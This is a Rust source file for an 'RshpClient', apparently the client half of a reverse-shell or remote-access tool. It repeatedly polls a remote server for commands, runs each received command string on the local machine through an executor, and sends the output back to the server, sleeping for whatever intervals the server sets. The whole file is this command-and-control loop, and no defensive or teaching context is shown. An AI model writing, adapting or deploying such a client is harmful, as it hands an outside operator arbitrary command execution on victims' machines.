use crate::transporter::Transporter;
use crate::cmd::Cmd;
use crate::executor;
use std::thread;
use std::time::Duration;

pub struct RshpClient {
    transporter: Transporter,
}

impl RshpClient {
    pub fn new(server: &str, port: u32) -> RshpClient {
        RshpClient {
            transporter: Transporter::new(server, port),
        }
    }

    pub fn run(&mut self) {
        loop {
            // Poll for new commands
            // GETCMD [int]id
            // CMD [string]buf
            // let id = format!("{}", self.id);
            
            let req = Cmd::new("GETCMD", "");
            self.transporter.send(req);

            // If TIMEOUT [int]sec sleep for [int]sec seconds and poll again
            // If CMD [string]cmd, execute() [string]cmd
            // If CLOSE return to polling
            let resp = self.transporter.recv();
            self.interperet(resp)
        }
    }

    fn interperet(&mut self, cmd: Cmd) {
        match cmd.get_directive().as_ref() {
            "TIMEOUT" => {
                let timeout = cmd.get_data().parse::<u64>().unwrap();
                thread::sleep(Duration::from_secs(timeout));
            },
            "CMD" => {
                let output = executor::execute(cmd.get_data().to_string());
                self.transporter.send(Cmd::new("CMDOUTPUT", output.as_ref()))
            },
            _ => {},
        }
    }
}